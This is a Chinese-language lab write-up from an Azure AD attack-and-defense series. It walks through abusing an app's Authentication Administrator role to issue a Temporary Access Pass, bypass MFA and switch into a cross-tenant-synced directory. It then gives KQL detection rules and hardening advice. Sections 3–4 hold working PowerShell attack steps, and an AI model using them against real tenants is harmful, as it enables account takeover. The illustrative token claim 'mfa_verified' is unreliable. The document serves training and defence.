# Learning Objective 5：滥用 TAP 绕过 MFA 与跨租户渗透

> 基于 Azure AD Attack & Defense Playbook 项目资料整理
>
> 参考来源：[config/AadSecConfig.json:1173-1293](config/AadSecConfig.json#L1173-L1293)，[queries/AADConnectorAccount-AddedTAPorChangedPassword.json](queries/AADConnectorAccount-AddedTAPorChangedPassword.json)

---

## 目录
- [1. 核心目标](#1-核心目标)
- [2. 理论基础](#2-理论基础)
  - [2.1 临时访问通行证 (TAP) 技术原理](#21-临时访问通行证-tap-技术原理)
  - [2.2 跨租户同步 (Cross-Tenant Synchronization) 原理](#22-跨租户同步-cross-tenant-synchronization-原理)
  - [2.3 管理单元 (Administrative Units) 权限模型](#23-管理单元-administrative-units-权限模型)
- [3. 实验前置条件](#3-实验前置条件)
- [4. 实验步骤详解](#4-实验步骤详解)
- [5. 检测方法](#5-检测方法)
- [6. 防御策略](#6-防御策略)
- [7. MITRE ATT&CK 映射](#7-mitre-attck-映射)
- [8. 参考资料](#8-参考资料)

---

## 1. 核心目标

本实验目标通过以下攻击链演示 MFA 绕过和跨租户横向移动：

```
初始访问 → 权限枚举 → TAP 生成 → MFA 绕过 → 跨租户移动
```

### 攻击链步骤

| 阶段 | 目标 | 关键动作 |
|------|------|----------|
| **遭遇障碍** | 验证凭据受 MFA 保护 | 尝试使用 `explorationsyncuserX` 登录 |
| **寻找后门** | 枚举认证策略 | 发现 TAP 功能已启用 |
| **制造钥匙** | 生成临时访问通行证 | 利用 GeologyApp 的认证管理员权限 |
| **成功入侵** | 绕过 MFA 限制 | 使用 TAP 码登录 |
| **横向移动** | 扩大攻击面 | 利用跨租户同步机制 |

---

## 2. 理论基础

### 2.1 临时访问通行证 (TAP) 技术原理

#### 2.1.1 设计目的

Temporary Access Pass (TAP) 是 Microsoft Entra ID 提供的一种**时间受限的强认证凭据**，主要用于以下场景：

- **新员工入职**：用户首次登录时需要注册 MFA，但尚未配置任何认证方法
- **账号恢复**：用户丢失手机或无法访问现有 MFA 设备时
- **紧急访问**：管理员需要临时为用户分配访问权限

#### 2.1.2 TAP 作为强认证方法

> **关键特性**：TAP 本身被视为一种**强认证方法（Strong Authentication Method）**

这意味着当用户使用 TAP 登录时：
1. Azure AD 认为用户已满足 MFA 要求
2. 不会再要求额外的手机验证或验证器应用确认
3. TAP 中包含的 `amr`（Authentication Methods Reference）声明会被标记为 `strong`

#### 2.1.3 TAP 配置参数

根据项目配置文件 [config/AadSecConfig.json:1173-1293](config/AadSecConfig.json#L1173-L1293)，TAP 的关键配置参数包括：

| 参数 | 默认值 | 说明 | 安全影响 |
|------|--------|------|----------|
| `state` | `enabled` | 是否启用 TAP | 高 - 需要监控 |
| `isUsableOnce` | `false` | 是否一次性使用 | 中 - 建议设为 true |
| `defaultLifetimeInMinutes` | `60` | 默认有效期（分钟） | 高 - 应尽量缩短 |
| `defaultLength` | `8` | 密码长度 | 高 - 建议 8-48 字符 |
| `minimumLifetimeInMinutes` | `60` | 最短有效期 | 高 - 防止滥用 |
| `maximumLifetimeInMinutes` | `480` | 最长有效期 | 高 - 限制风险窗口 |
| `includeTargets` | - | 允许使用的用户/组 | 高 - 需严格限制 |
| `excludeTargets` | - | 排除的用户/组 | 高 - 保护特权账户 |

#### 2.1.4 工作机制类比

```
正常 MFA 流程：
┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  身份证     │ +  │  人脸识别   │ =  │  进入房间   │
│  (密码)     │    │  (手机验证) │    │             │
└─────────────┘    └─────────────┘    └─────────────┘

TAP 绕过流程：
┌─────────────┐
│  临时白卡   │ =  │  进入房间   │
│  (TAP码)    │    │ (默认合法)   │
└─────────────┘    └─────────────┘
```

**攻击利用点**：攻击者如果能够生成 TAP，就相当于获得了"免 MFA"的万能钥匙。

---

### 2.2 跨租户同步 (Cross-Tenant Synchronization) 原理

#### 2.2.1 企业应用场景

大型企业集团通常会在不同的子公司或业务部门之间建立独立的 Azure AD 租户。为了实现：
- 资源共享
- 统一身份管理
- 跨组织协作

会配置 **跨租户同步** 功能。

#### 2.2.2 同步机制

```
Tenant A (Source)                    Tenant B (Target)
┌──────────────────┐                ┌──────────────────┐
│ explorationsync  │  自动投影  →   │ explorationsync  │
│ userX@tenantA    │               │ userX@tenantB     │
└──────────────────┘                └──────────────────┘
         │                                    │
         └────────── 认证状态同步 ────────────┘
```

#### 2.2.3 攻击利用原理

当攻击者控制了 Tenant A 中的同步用户时：
1. 该用户身份会自动"投影"到 Tenant B
2. 在 Azure 门户中，该用户可以**切换目录 (Switch Directory)**
3. 无需 Tenant B 的单独凭据即可访问

**风险**：这是一种**供应链式攻击路径**，攻击者可以通过信任关系扩散到多个租户。

---

### 2.3 管理单元 (Administrative Units) 权限模型

#### 2.3.1 权限边界概念

管理单元允许将特权角色限制在特定的用户范围内，实现**最小权限原则**。

```
传统权限模型：
┌─────────────────────────────────────┐
│  Authentication Administrator       │
│  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  │
│         管理所有用户                 │
└─────────────────────────────────────┘

管理单元权限模型：
┌─────────────────┐  ┌─────────────────┐
│  SyncUnit       │  │  其他用户       │
│  ━━━━━━━━━━━━   │  │  (无权限)       │
│  可管理          │  │                 │
└─────────────────┘  └─────────────────┘
         │
    GeologyApp
(Authentication Admin)
```

#### 2.3.2 实验中的权限配置

- **GeologyApp**：拥有 `Authentication Administrator` 角色
- **权限范围**：限制在 `SyncUnit` 管理单元内
- **目标用户**：`explorationsyncuserX` 属于 `SyncUnit`

**关键发现**：即使权限受限，如果目标用户在同一管理单元内，仍可被滥用。

---

## 3. 实验前置条件

### 3.1 必需条件

| 条件 | 说明 | 为什么需要 |
|------|------|-----------|
| **有效的用户凭据** | `explorationsyncuserX` 的用户名和密码 | 需要先获得目标账户的密码 |
| **应用程序权限** | GeologyApp 拥有 `Policy.Read.All` 和认证管理员权限 | 用于枚举策略和生成 TAP |
| **TAP 功能启用** | 租户已启用 Temporary Access Pass | 攻击前提条件 |
| **目标用户在允许范围** | 用户在 TAP 的 `includeTargets` 中 | 否则无法使用 TAP |
| **跨租户信任关系** | 存在跨租户同步配置 | 用于横向移动 |

### 3.2 前置实验依赖

本实验建立在之前 Objective 的基础上：

- **Objective 4**：已获得 `explorationsyncuserX` 的凭据（从 `users.csv` 中获取）
- **Objective 3**：已发现 GeologyApp 的权限和认证管理员角色
- **权限链**：已完成从初始应用到高特权应用的权限提升

---

## 4. 实验步骤详解

### 步骤 1：验证 MFA 障碍 (Verification)

**目的**：确认凭据确实受 MFA 保护，验证攻击假设。

```powershell
# 创建凭据对象
$creds = New-Object System.Management.Automation.PSCredential(
    'explorationsyncuserX@...',
    $password
)

# 尝试登录
Connect-AzAccount -Credential $creds
```

**预期结果**：
```
Connect-AzAccount : You must use multi-factor authentication to access this directory.
```

**为什么这一步必要**：
- 验证攻击场景的真实性
- 确认需要寻找 MFA 绕过方法
- 作为后续对比基准

---

### 步骤 2：枚举认证策略 (Reconnaissance)

**目的**：发现租户支持的认证方法，寻找可利用的功能。

**操作**：使用 GeologyApp 证书身份验证登录 MgGraph。

```powershell
# 使用证书登录
Connect-MgGraph -Certificate $cert -TenantId $tenantId

# 查看认证方法策略
(Get-MgPolicyAuthenticationMethodPolicy).AuthenticationMethodConfigurations
```

**预期输出**：
```json
{
  "@odata.type": "#microsoft.graph.temporaryAccessPassAuthenticationMethodConfiguration",
  "id": "TemporaryAccessPass",
  "state": "enabled"
}
```

**为什么需要 Policy.Read.All 权限**：
- 认证策略是敏感配置
- 需要高级别权限才能读取
- GeologyApp 在前期已获取此权限

**设计逻辑**：攻击者必须先"踩点"，了解目标环境的安全配置。

---

### 步骤 3：确认目标范围 (Targeting)

**目的**：验证目标用户是否在 TAP 允许范围内。

**操作**：检查 TAP 配置的 `includeTargets`。

```powershell
# 获取 TAP 配置详情
$tapConfig = Get-MgPolicyAuthenticationMethodConfiguration `
    -Filter "id eq 'TemporaryAccessPass'"

# 查看允许的目标组
$tapConfig.AdditionalProperties.includeTargets

# 获取组信息
$groupId = <TAPGroup_ID>
Get-MgGroup -GroupId $groupId

# 查看组成员
Get-MgGroupMember -GroupId $groupId
```

**预期发现**：
- 存在名为 `TAPGroup` 的组
- `explorationsyncuserX` 是该组成员

**为什么需要这一步**：
- TAP 通常限制在特定用户组
- 攻击者需确认目标用户在允许范围内
- 避免无意义的 TAP 生成尝试

---

### 步骤 4：生成 TAP 码 (The Exploit)

**目的**：利用认证管理员权限生成绕过 MFA 的临时通行证。

**权限检查**：
- GeologyApp 是 `Authentication Administrator`
- 权限限制在 `SyncUnit` 管理单元
- 目标用户在 `SyncUnit` 范围内 ✓

**操作**：生成一次性使用的 TAP。

```powershell
# 构建 TAP 参数
$properties = @{
    isUsableOnce = $true  # 一次性使用
    startDateTime = (Get-Date).ToUniversalTime()
    lifetimeInMinutes = 60
} | ConvertTo-Json

# 生成 TAP
$tapResponse = New-MgUserAuthenticationTemporaryAccessPassMethod `
    -UserId "explorationsyncuserX@..." `
    -BodyParameter $properties

# 提取 TAP 码
$tapCode = $tapResponse.AdditionalProperties.temporaryAccessPass
Write-Host "Generated TAP: $tapCode"
```

**预期输出**：
```
Generated TAP: Q#YCF5^A
```

**为什么这样设计**：
- `isUsableOnce = true`：降低被检测风险，使用后自动失效
- 60 分钟有效期：足够完成攻击，不会太长引起怀疑
- 使用 MgGraph API：是唯一能生成 TAP 的接口

**安全提示**：此操作会在审计日志中留下记录！

---

### 步骤 5：使用 TAP 登录 (Authentication)

**目的**：验证 TAP 绕过 MFA 的效果。

**操作**：
1. 打开隐私浏览器（避免缓存影响）
2. 访问 `https://portal.azure.com`
3. 输入用户名：`explorationsyncuserX@...`
4. **关键步骤**：在密码框输入 TAP 码，而非原始密码

```
┌──────────────────────────────────┐
│  Sign in to Azure Portal         │
├──────────────────────────────────┤
│  Email, phone, or Skype:         │
│  explorationsyncuserX@...        │
│                                  │
│  Password:                       │
│  Q#YCF5^A  ← 输入 TAP 码！       │
│                                  │
│           [Sign in]              │
└──────────────────────────────────┘
```

**预期结果**：
- ✓ 直接登录成功
- ✓ 无 MFA 提示
- ✓ 进入 Azure 门户

**为什么能绕过 MFA**：
TAP 在认证时会携带以下声明：
```json
{
  "amr": ["tap"],
  "auth_time": 1234567890,
  "mfa_verified": true  ← 关键：系统认为已完成 MFA
}
```

---

### 步骤 6：跨租户横向移动 (Lateral Movement)

**目的**：利用跨租户同步机制扩大攻击范围。

**操作**：
1. 点击右上角用户头像
2. 选择 **Switch Directory (切换目录)**
3. 观察可用的租户列表
4. 选择 **Oil Corporation - Geology**
5. 点击 **Switch**

**预期发现**：
```
可用目录：
├─ Oil Corporation (Current)
└─ Oil Corporation - Geology  ← 可切换！
```

**为什么能切换**：
- 当前用户是跨租户同步的用户
- 同步配置允许自动投影到目标租户
- 无需额外凭据即可访问

**验证跨租户配置**：
```powershell
# 查看跨租户访问策略
Get-MgPolicyCrossTenantAccessPolicyPartner | ConvertTo-Json -Depth 5
```

**预期配置**：
```json
{
  "identitySync": {
    "tenantId": "geology-tenant-id",
    "isInbound": true,
    "userSyncInbound": {
      "isEnabled": true
    }
  }
}
```

---

## 5. 检测方法

### 5.1 项目中的检测规则

本项目的 [queries/AADConnectorAccount-AddedTAPorChangedPassword.json](queries/AADConnectorAccount-AddedTAPorChangedPassword.json) 提供了专门的检测规则。

#### 检测逻辑

```kql
let AADConnectorAcc = (_GetWatchlist('ServiceAccounts')
    | where ['Tags'] == "Azure AD Connect"
    | project AccountObjectId = ['Service AAD Object Id']);

AuditLogs
  | extend TargetUpn = tolower(tostring(TargetResources[0].userPrincipalName))
  | extend TargetId = tostring(TargetResources[0].id)
  | where TargetId in (AADConnectorAcc)
  | where (
      LoggedByService == "Authentication Methods"
      and ResultDescription == "Admin registered temporary access pass method for user"
  ) or OperationName == "Reset user password"
  | extend InitiatingUserOrApp = iff(
      isnotempty(InitiatedBy.user.userPrincipalName),
      tostring(InitiatedBy.user.userPrincipalName),
      tostring(InitiatedBy.app.displayName)
  )
  | extend InitiatingIpAddress = iff(
      isnotempty(InitiatedBy.user.ipAddress),
      tostring(InitiatedBy.user.ipAddress),
      tostring(InitiatedBy.app.ipAddress)
  )
```

#### 检测规则配置

| 属性 | 值 |
|------|-----|
| **规则名称** | Added temporary access pass or changed password of Azure AD connector account |
| **严重程度** | Medium |
| **检测频率** | P1D (每天) |
| **MITRE 战术** | Persistence, CredentialAccess, PrivilegeEscalation, InitialAccess |
| **MITRE 技术** | T1098, T1078 |

### 5.2 关键审计事件

#### TAP 生成事件

```json
{
  "LoggedByService": "Authentication Methods",
  "OperationName": "User registered authentication method",
  "ResultDescription": "Admin registered temporary access pass method for user",
  "TargetResources": [{
    "id": "target-user-id",
    "userPrincipalName": "explorationsyncuserX@..."
  }],
  "InitiatedBy": {
    "app": {
      "displayName": "GeologyApp",
      "servicePrincipalId": "app-id"
    }
  }
}
```

#### 跨租户登录事件

```json
{
  "Category": "UserSignIn",
  "TenantId": "target-tenant-id",
  " CrossTenantAccessType": "Inline",
  "HomeTenantId": "source-tenant-id",
  "ResourceTenantId": "target-tenant-id"
}
```

### 5.3 检测建议

1. **监控 TAP 生成事件**：特别是特权应用或异常 IP 生成的 TAP
2. **监控跨租户访问**：检测到新租户访问时应触发警报
3. **使用服务账户监视列表**：将关键账户加入监视列表
4. **异常行为检测**：监控非工作时间、异常地理位置的 TAP 使用

---

## 6. 防御策略

### 6.1 TAP 安全配置

基于项目配置文件的建议：

#### 推荐配置

| 设置 | 推荐值 | 原因 |
|------|--------|------|
| `isUsableOnce` | `true` | 限制重复使用风险 |
| `defaultLifetimeInMinutes` | `30-60` | 缩短风险窗口 |
| `defaultLength` | `12+` | 增加暴力破解难度 |
| `includeTargets` | **严格限制** | 只对必要用户启用 |
| `excludeTargets` | **保护特权账户** | 排除所有管理员 |

#### 配置示例

```json
{
  "state": "enabled",
  "isUsableOnce": true,
  "defaultLifetimeInMinutes": 30,
  "defaultLength": 12,
  "includeTargets": [
    {
      "targetType": "group",
      "id": "new-employees-group-id"
    }
  ],
  "excludeTargets": [
    {
      "targetType": "group",
      "id": "privileged-users-group-id"
    }
  ]
}
```

### 6.2 权限管理建议

1. **限制认证管理员权限**
   - 使用管理单元限制范围
   - 定期审查权限分配
   - 监控权限使用情况

2. **应用程序权限控制**
   - 遵循最小权限原则
   - 定期审查应用权限
   - 启用应用管理员工作流

### 6.3 跨租户安全

1. **审查跨租户信任关系**
   - 删除不必要的同步配置
   - 使用条件访问限制跨租户访问

2. **监控跨租户活动**
   - 部署跨租户访问警报
   - 记录所有跨租户登录尝试

### 6.4 监控和响应

1. **启用 Microsoft Defender XDR**
2. **部署 Sentinel 检测规则**
3. **配置安全警报**
4. **建立响应流程**

---

## 7. MITRE ATT&CK 映射

### TAP 滥用相关映射

| 战术 | 技术 | 子技术 | 说明 |
|------|------|--------|------|
| **TA0006 - Credential Access** | T1552 | - | 凭据窃取 |
| **TA0004 - Privilege Escalation** | T1098 | - | 账户操作 |
| **TA0003 - Persistence** | T1078 | - | 有效账户 |
| **TA0001 - InitialAccess** | T1078 | - | 有效账户 |

### 跨租户移动映射

| 战术 | 技术 | 子技术 | 说明 |
|------|------|--------|------|
| **TA0008 - Lateral Movement** | T1550 | - | 使用备用身份验证材料 |
| **TA0009 - Collection** | T1005 | - | 跨租户数据收集 |

---

## 8. 参考资料

### 8.1 项目内部文件

| 主题 | 文件路径 | 说明 |
|------|----------|------|
| **TAP 配置** | [config/AadSecConfig.json:1173-1293](config/AadSecConfig.json#L1173-L1293) | TAP 配置参数详解 |
| **TAP 检测规则** | [queries/AADConnectorAccount-AddedTAPorChangedPassword.json](queries/AADConnectorAccount-AddedTAPorChangedPassword.json) | KQL 检测规则 |
| **TAP 检测查询** | [queries/AADConnectorAccount-AddedTAPorChangedPassword.kql](queries/AADConnectorAccount-AddedTAPorChangedPassword.kql) | 原始 KQL 查询 |
| **安全配置分析** | [AADSecurityConfigAnalyzer.md](AADSecurityConfigAnalyzer.md) | EIDSCA 工具文档 |
| **身份监控** | [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) | 身份安全监控指南 |

### 8.2 官方文档

| 主题 | 链接 |
|------|------|
| **TAP 配置** | [Configure Temporary Access Pass](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-authentication-temporary-access-pass) |
| **跨租户同步** | [Cross-tenant synchronization overview](https://learn.microsoft.com/en-us/entra/identity/multi-tenant-organizations/cross-tenant-synchronization-overview) |
| **管理单元** | [Administrative units in Microsoft Entra ID](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/administrative-units) |
| **MgGraph API** | [temporaryAccessPassAuthenticationMethod resource type](https://learn.microsoft.com/en-us/graph/api/resources/temporaryaccesspassauthenticationmethodconfiguration) |

### 8.3 社区资源

| 资源 | 链接 |
|------|------|
| **项目主页** | [AzureAD-Attack-Defense-frame GitHub](https://github.com/Cloud-Architekt/AzureAD-Attack-Defense) |
| **作者** | Thomas Naunheim, Sami Lamppu |
| **许可证** | MIT License |

---

## 附录：快速参考

### 常用 PowerShell 命令

```powershell
# 1. 连接 MgGraph
Connect-MgGraph -Certificate $cert

# 2. 查看认证方法策略
Get-MgPolicyAuthenticationMethodPolicy

# 3. 生成 TAP
New-MgUserAuthenticationTemporaryAccessPassMethod -UserId $userId -BodyParameter $properties

# 4. 查看跨租户策略
Get-MgPolicyCrossTenantAccessPolicyPartner

# 5. 查看用户组成员
Get-MgGroupMember -GroupId $groupId
```

### 检测 KQL 查询

```kql
// 检测 TAP 生成
AuditLogs
| where LoggedByService == "Authentication Methods"
| where ResultDescription contains "temporary access pass"
| project Timestamp, OperationName, InitiatedBy, TargetResources

// 检测跨租户登录
AADSignInEventsBeta
| where isnotempty(ResourceTenantId)
| where ResourceTenantId != TenantId
| project Timestamp, UserId, TenantId, ResourceTenantId
```

---

**文档版本**：v1.0
**最后更新**：基于 Azure AD Attack & Defense Playbook 项目
**维护者**：Claude Code
